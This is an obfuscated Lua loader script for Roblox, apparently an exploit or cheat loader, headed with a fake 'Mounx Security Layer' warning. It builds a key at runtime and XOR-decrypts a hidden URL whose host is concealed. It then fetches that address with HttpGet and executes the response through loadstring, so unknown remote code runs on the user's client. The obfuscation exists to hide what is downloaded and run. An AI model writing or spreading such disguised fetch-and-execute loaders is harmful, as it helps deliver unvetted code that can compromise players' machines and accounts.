-- Mounx Loader
-- Protected by Mounx Security Layer v3
-- Unauthorized modification will result in ban

local _s,_c,_b,_x,_tc = string,string.char,string.byte,bit32.bxor,table.concat
local _g = game

-- Environment validation
local ___veq = type(_g)=="userdata" and (type(loadstring)=="function" or type(load)=="function")
if not ___veq then return end
local _nisr = pcall(function() return _g:GetService("Players").LocalPlayer end)
if not _nisr then return end

-- Runtime key derivation
local ___tmaw={}
___tmaw[4]=_c(144/3)
___tmaw[1]=_c(231/3)
___tmaw[2]=_c(_x(211,0xAB))
___tmaw[7]=_c(_x(241,0xAB))
___tmaw[5]=_c(97-46)
___tmaw[11]=_c(_x(155,0xAB))
___tmaw[10]=_c(_x(157,0xAB))
___tmaw[6]=_c(144/3)
___tmaw[3]=_c(23+31)
___tmaw[8]=_c(_x(192,0xAB))
___tmaw[9]=_c(71-20)
___tmaw=_tc(___tmaw)

-- Encrypted payload
local _bif={37,12,66,64,64,10,117}
local _glhg={68,94,89,69,35,0,70}
local _earqcq={81,93,85,54,69,92,88}
local _usie={66,40,22,82,85,65,30}
local _xscg={57,4,94,25,81,61,17}
local _xroh={25,92,92,81,62,14,65}
local _bzmc={25,64,56,26,90,89,80}

-- Assemble
local __lpeg={}
for _i=1,#_bif do __lpeg[#__lpeg+1]=_bif[_i] end
for _i=1,#_glhg do __lpeg[#__lpeg+1]=_glhg[_i] end
for _i=1,#_earqcq do __lpeg[#__lpeg+1]=_earqcq[_i] end
for _i=1,#_usie do __lpeg[#__lpeg+1]=_usie[_i] end
for _i=1,#_xscg do __lpeg[#__lpeg+1]=_xscg[_i] end
for _i=1,#_xroh do __lpeg[#__lpeg+1]=_xroh[_i] end
for _i=1,#_bzmc do __lpeg[#__lpeg+1]=_bzmc[_i] end

-- Decrypt
local ___edjr={}
for _i=1,#__lpeg do
    ___edjr[_i]=_c(_x(__lpeg[_i],_b(___tmaw,((_i-1)%#___tmaw)+1)))
end
___edjr=_tc(___edjr)

-- Execute
local _egxwnq=tick()
local ___wotj=_g["HttpGet"](_g,___edjr)
if type(___wotj)=="string" and #___wotj>0 then
    local _lxflo=(loadstring or load)(___wotj)
    if _lxflo then _lxflo() end
end
